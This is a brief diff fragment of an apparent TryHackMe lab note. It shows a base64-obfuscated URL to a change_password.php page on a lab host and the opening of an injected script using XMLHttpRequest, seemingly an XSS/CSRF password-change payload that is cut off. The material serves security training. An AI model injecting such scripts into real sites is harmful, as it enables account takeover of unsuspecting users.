@@ -4,6 +4,8 @@
 
 ```atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw')``` Base64 encode otherwise ```'http://login.worldwap.thm/change_password.php'```
 
+
+courtesy of tryhackme:
 ```
 <script>
         var xhr = new XMLHttpRequest();
